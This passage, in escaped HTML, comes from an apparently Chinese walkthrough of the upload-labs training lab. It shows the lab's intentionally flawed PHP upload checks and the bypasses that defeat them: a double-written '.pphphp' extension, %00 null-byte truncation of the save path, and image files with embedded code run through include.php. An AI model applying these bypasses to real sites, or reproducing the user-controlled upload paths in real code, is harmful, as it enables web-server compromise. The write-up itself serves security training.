class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;利用双写进行绕过 a.pphphp&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311200535082.png&#34; alt=&#34;image-20210311200535082&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311200557774.png&#34; alt=&#34;image-20210311200557774&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-1100截断&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-1100截断&#34;&gt;#&lt;/a&gt; Pass-11 (%00 截断)&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = substr(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;],strrpos(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);  截取后缀名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_path&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				上面这里是GET&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 POST 更改为 a.php%00 截断&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311204205040.png&#34; alt=&#34;image-20210311204205040&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311204322772.png&#34; alt=&#34;image-20210311204322772&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-1200截断hex&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-1200截断hex&#34;&gt;#&lt;/a&gt; Pass-12 (%00 截断 hex)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = substr(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;],strrpos(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;],&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$ext_arr&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;save_path&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				上面这里是POST&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;上传失败&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;只允许上传.jpg|.png|.gif类型文件！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311204606304.png&#34; alt=&#34;image-20210311204606304&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311205039010.png&#34; alt=&#34;image-20210311205039010&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功上传，访问 a.php&lt;/p&gt;
&lt;h2 id=&#34;pass-13图片码利用includephp包含&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-13图片码利用includephp包含&#34;&gt;#&lt;/a&gt; Pass-13 (图片码，利用 include.php 包含)&lt;/h2&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;getReailFileType&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt; = fopen(&lt;span class=&#34;variable&#34;&gt;$filename&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;rb&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$bin&lt;/span&gt; = fread(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//只读2字节&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fclose(&lt;span class=&#34;variable&#34;&gt;$file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$strInfo&lt;/span&gt; = @unpack(&lt;span class=&#34;string&#34;&gt;&amp;quot;C2chars&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$bin&lt;/span&gt;);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$typeCode&lt;/span&gt; = intval(&lt;span class=&#34;variable&#34;&gt;$strInfo&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;chars1&amp;#x27;&lt;/span&gt;].&lt;span class=&#34;variable&#34;&gt;$strInfo&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;chars2&amp;#x27;&lt;/span&gt;]);    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$typeCode&lt;/span&gt;)&amp;#123;      &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;255216&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;jpg&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;13780&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;png&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;        &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;7173&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;gif&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;unknown&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$fileType&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable&#34;&gt;$file_type&lt;/span&gt; = getReailFileType(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$file_type&lt;/span&gt; == &lt;span class=&#34;string&#34;&gt;&amp;#x27;unknown&amp;#x27;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;quot;文件未知，上传失败！&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;.rand(&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;99&lt;/span&gt;).date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;.&lt;span 